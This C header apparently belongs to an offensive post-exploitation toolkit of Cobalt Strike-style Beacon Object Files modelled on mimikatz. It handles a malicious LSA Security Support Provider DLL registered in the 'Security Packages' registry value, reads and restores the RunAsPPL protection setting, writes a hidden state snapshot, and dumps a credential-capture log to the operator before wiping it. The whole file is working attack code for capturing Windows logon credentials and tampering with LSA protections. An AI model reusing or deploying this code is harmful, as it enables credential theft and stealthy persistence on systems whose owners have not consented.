// ssp_bof.h — minimal shared defs for SSPMon BOFs (self-contained; no CRT).
// Mirrors the conventions of ../mimikatz/BOF (beacon.h API, go() entry,
// internal_printf output) without the mimikatz-specific DFR machinery.
#ifndef SSP_BOF_H
#define SSP_BOF_H

#include "beacon.h"
#include <windows.h>

// this tree's minimal beacon.h uses DECLSPEC_IMPORT but never defines EXPORT
#ifndef DECLSPEC_EXPORT
#define DECLSPEC_EXPORT __declspec(dllexport)
#endif

#define SSP_DLL_NAME     L"sspmon2"
#define SSP_DLL_PATH     L"%SystemRoot%\\System32\\sspmon2.dll"
#define SSP_LOG_PATH     L"%SystemRoot%\\Temp\\ssp.log"
#define SSP_REG_KEY      L"SYSTEM\\CurrentControlSet\\Control\\Lsa"
#define SSP_REG_VALUE    L"Security Packages"
#define SSP_REG_PPL      L"RunAsPPL"
#define SSP_DLL_SIZE     230942

// Expand %SystemRoot% and friends via environment (kernel32, no CRT)
static BOOL SSP_Expand(const wchar_t* tpl, wchar_t* out, DWORD cap)
{
    DWORD n = ExpandEnvironmentStringsW(tpl, out, cap);
    return n > 0 && n < cap;
}

static void SSP_OutW(const wchar_t* s)   { BeaconOutput(CALLBACK_OUTPUT, (char*)s, lstrlenW(s) * 2); }
static void SSP_OutA(const char* s)      { BeaconOutput(CALLBACK_OUTPUT, (char*)s, lstrlenA(s)); }

// Small helpers (no CRT): hex/dec printers
static void SSP_U64ToDecW(unsigned long long v, wchar_t* out)
{
    wchar_t tmp[24]; int i = 0, j = 0;
    if (!v) { out[0] = L'0'; out[1] = 0; return; }
    while (v) { tmp[i++] = L'0' + (wchar_t)(v % 10); v /= 10; }
    while (i) out[j++] = tmp[--i];
    out[j] = 0;
}

static void SSP_LastErr(const char* what)
{
    char buf[160];
    unsigned e = (unsigned)GetLastError();
    const char* hex = "0123456789abcdef";
    int p = 0;
    const char* s = what;
    while (*s && p < 120) buf[p++] = *s++;
    buf[p++] = ':'; buf[p++] = ' '; buf[p++] = 'e'; buf[p++] = 'r'; buf[p++] = 'r'; buf[p++] = '=';
    buf[p++] = '0'; buf[p++] = 'x';
    for (int sh = 28; sh >= 0 && p < 150; sh -= 4) { char c = hex[(e >> sh) & 0xf]; if (c != '0' || p > 8 || sh == 0) buf[p++] = c; }
    buf[p] = 0;
    BeaconOutput(CALLBACK_ERROR, buf, p);
}

// Read a registry DWORD (advapi32); returns TRUE if value exists
static BOOL SSP_RegGetDword(const wchar_t* val, DWORD* out)
{
    HKEY k;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, SSP_REG_KEY, 0, KEY_QUERY_VALUE, &k) != ERROR_SUCCESS) return FALSE;
    DWORD type = 0, size = sizeof(DWORD);
    BOOL ok = RegQueryValueExW(k, val, NULL, &type, (BYTE*)out, &size) == ERROR_SUCCESS && type == REG_DWORD;
    RegCloseKey(k);
    return ok;
}

// ---- no-CRT helpers (BOFs must not emit memcpy/memset calls) ----
static void SSP_Copy(void* dst, const void* src, DWORD n)
{
    BYTE* d = (BYTE*)dst; const BYTE* s = (const BYTE*)src;
    while (n--) *d++ = *s++;
}
static void SSP_Zero(void* p, DWORD n) { BYTE* d = (BYTE*)p; while (n--) *d++ = 0; }

// ---- state snapshot (restore-to-original support) ----
// File format (native LE): magic "SPSN", ver=1,
//   secPkgsPresent u32, secPkgsBytes u32, raw REG_MULTI_SZ bytes,
//   pplPresent u32, pplValue u32
#define SSP_SNAP_PATH   L"%SystemRoot%\\Temp\\sst.bin"
#define SSP_SNAP_MAGIC  0x4E535053u   /* "SPSN" */
#define SSP_SNAP_VER    1u
#define SSP_SNAP_MAX    4096

typedef struct {
    DWORD magic, ver;
    DWORD secPkgsPresent, secPkgsBytes;
    BYTE  secPkgsData[SSP_SNAP_MAX];
    DWORD pplPresent, pplValue;
} SSP_SNAPSHOT;

static BOOL SSP_DoesMultiContainSspmon2(HKEY k)
{
    DWORD type = 0, sz = 0;
    if (RegQueryValueExW(k, SSP_REG_VALUE, NULL, &type, NULL, &sz) != ERROR_SUCCESS) return FALSE;
    if (type != REG_MULTI_SZ || sz < 4 || sz > SSP_SNAP_MAX) return FALSE;
    BYTE buf[SSP_SNAP_MAX];
    if (RegQueryValueExW(k, SSP_REG_VALUE, NULL, &type, buf, &sz) != ERROR_SUCCESS) return FALSE;
    wchar_t* w = (wchar_t*)buf;
    wchar_t* end = (wchar_t*)(buf + sz);
    while (w < end && *w)
    {
        const wchar_t* n = SSP_DLL_NAME;
        const wchar_t* a = w;
        while (*a && *n && *a == *n) { a++; n++; }
        if (!*n && !*a) return TRUE;
        w += lstrlenW(w) + 1;
    }
    return FALSE;
}

// Returns TRUE if a NEW snapshot was written (FALSE = skipped/failed)
static BOOL SSP_SnapshotSave(void)
{
    SSP_SNAPSHOT* s = (SSP_SNAPSHOT*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SSP_SNAPSHOT));
    if (!s) return FALSE;
    s->magic = SSP_SNAP_MAGIC; s->ver = SSP_SNAP_VER;

    HKEY k;
    BOOL ok = FALSE;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, SSP_REG_KEY, 0, KEY_QUERY_VALUE, &k) == ERROR_SUCCESS)
    {
        DWORD type = 0, sz = 0;
        if (RegQueryValueExW(k, SSP_REG_VALUE, NULL, &type, NULL, &sz) == ERROR_SUCCESS
            && type == REG_MULTI_SZ && sz >= 4 && sz <= SSP_SNAP_MAX)
        {
            if (RegQueryValueExW(k, SSP_REG_VALUE, NULL, &type, s->secPkgsData, &sz) == ERROR_SUCCESS)
            {
                // reinstall guard: if value already contains sspmon2, this is not
                // the original state — don't snapshot our own modification
                if (!SSP_DoesMultiContainSspmon2(k))
                {
                    s->secPkgsPresent = 1; s->secPkgsBytes = sz;
                }
                else
                {
                    s->secPkgsPresent = 0; s->secPkgsBytes = 0;
                }
            }
        }
        else
        {
            s->secPkgsPresent = 0; s->secPkgsBytes = 0;   // absent or empty
        }
        s->pplPresent = SSP_RegGetDword(SSP_REG_PPL, &s->pplValue) ? 1u : 0u;
        RegCloseKey(k);

        // if a snapshot already exists (true original), keep it
        wchar_t snapPath[MAX_PATH];
        if (SSP_Expand(SSP_SNAP_PATH, snapPath, MAX_PATH)
            && GetFileAttributesW(snapPath) != INVALID_FILE_ATTRIBUTES)
        {
            HeapFree(GetProcessHeap(), 0, s);
            return FALSE;   // original snapshot already on disk — do not clobber
        }

        HANDLE f = CreateFileW(snapPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (f != INVALID_HANDLE_VALUE)
        {
            DWORD w = 0;
            if (WriteFile(f, s, sizeof(SSP_SNAPSHOT), &w, NULL) && w == sizeof(SSP_SNAPSHOT)) ok = TRUE;
            CloseHandle(f);
        }
    }
    HeapFree(GetProcessHeap(), 0, s);
    return ok;
}

// Returns TRUE if a snapshot was found and applied; *applied says whether any
// registry change was made. Manual override values override missing snapshot.
static BOOL SSP_SnapshotRestore(DWORD manualPpl, BOOL useManualPpl, BOOL* applied)
{
    *applied = FALSE;
    wchar_t snapPath[MAX_PATH];
    if (!SSP_Expand(SSP_SNAP_PATH, snapPath, MAX_PATH)) return FALSE;
    HANDLE f = CreateFileW(snapPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (f == INVALID_HANDLE_VALUE) return FALSE;

    SSP_SNAPSHOT* s = (SSP_SNAPSHOT*)HeapAlloc(GetProcessHeap(), 0, sizeof(SSP_SNAPSHOT));
    if (!s) { CloseHandle(f); return FALSE; }
    DWORD got = 0;
    BOOL ok = ReadFile(f, s, sizeof(SSP_SNAPSHOT), &got, NULL) && got == sizeof(SSP_SNAPSHOT)
              && s->magic == SSP_SNAP_MAGIC && s->ver == SSP_SNAP_VER;
    CloseHandle(f);
    if (!ok) { HeapFree(GetProcessHeap(), 0, s); return FALSE; }

    HKEY k;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, SSP_REG_KEY, 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &k) != ERROR_SUCCESS)
    { HeapFree(GetProcessHeap(), 0, s); return FALSE; }

    if (s->secPkgsPresent && s->secPkgsBytes >= 4)
    {
        if (RegSetValueExW(k, SSP_REG_VALUE, 0, REG_MULTI_SZ, s->secPkgsData, s->secPkgsBytes) == ERROR_SUCCESS)
        {
            SSP_OutA("[+] Security Packages restored to original value\n");
            *applied = TRUE;
        }
        else SSP_LastErr("restore RegSetValueExW(Security Packages)");
    }
    else
    {
        LONG r = RegDeleteValueW(k, SSP_REG_VALUE);
        if (r == ERROR_SUCCESS)      { SSP_OutA("[+] Security Packages deleted (originally absent)\n"); *applied = TRUE; }
        else if (r == ERROR_FILE_NOT_FOUND) SSP_OutA("[*] Security Packages already absent\n");
        else SSP_LastErr("restore RegDeleteValueW(Security Packages)");
    }

    if (s->pplPresent)
    {
        if (RegSetValueExW(k, SSP_REG_PPL, 0, REG_DWORD, (const BYTE*)&s->pplValue, sizeof(DWORD)) == ERROR_SUCCESS)
        {
            wchar_t b[24]; SSP_U64ToDecW(s->pplValue, b);
            SSP_OutA("[+] RunAsPPL restored to original: "); SSP_OutW(b); SSP_OutA("\n");
            *applied = TRUE;
        }
        else SSP_LastErr("restore RunAsPPL");
    }
    else
    {
        LONG r = RegDeleteValueW(k, SSP_REG_PPL);
        if (r == ERROR_SUCCESS)      { SSP_OutA("[+] RunAsPPL deleted (originally unset)\n"); *applied = TRUE; }
        else if (r != ERROR_FILE_NOT_FOUND) SSP_LastErr("restore RegDeleteValueW(RunAsPPL)");
    }
    RegCloseKey(k);
    HeapFree(GetProcessHeap(), 0, s);
    return TRUE;
}

// Dump the capture log to console (cap 64 KiB, tail). Used by ssp_log BOF and
// by sspremove /wipe-log so evidence is printed before destruction.
static void SSP_DumpLog(void)
{
    wchar_t logPath[MAX_PATH];
    if (!SSP_Expand(SSP_LOG_PATH, logPath, MAX_PATH)) { SSP_LastErr("expand log path"); return; }
    HANDLE f = CreateFileW(logPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (f == INVALID_HANDLE_VALUE) { SSP_OutA("[*] ssp.log absent — nothing to dump\n"); return; }
    DWORD hi = 0, lo = GetFileSize(f, &hi);
    unsigned long long total = ((unsigned long long)hi << 32) | lo;
    wchar_t nb[24];
    SSP_OutA("[*] ssp.log size: "); SSP_U64ToDecW(total, nb); SSP_OutW(nb); SSP_OutA(" bytes\n");
    DWORD skip = (total > (64 * 1024)) ? (DWORD)(total - 64 * 1024) : 0;
    DWORD size = (DWORD)(total - skip);
    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, size ? size : 1);
    if (!buf) { SSP_LastErr("HeapAlloc(log)"); CloseHandle(f); return; }
    LARGE_INTEGER li; li.QuadPart = (LONGLONG)skip;
    BOOL ok = (SetFilePointer(f, li.LowPart, &li.HighPart, FILE_BEGIN) != INVALID_SET_FILE_POINTER) || GetLastError() == NO_ERROR;
    DWORD got = 0;
    ok = ok && ReadFile(f, buf, size, &got, NULL);
    CloseHandle(f);
    if (!ok) { SSP_LastErr("ReadFile(log)"); HeapFree(GetProcessHeap(), 0, buf); return; }
    SSP_OutA("---- ssp.log ----\n");
    BeaconOutput(CALLBACK_OUTPUT, buf, (int)got);
    SSP_OutA("---- end ssp.log ----\n");
    HeapFree(GetProcessHeap(), 0, buf);
}

#endif
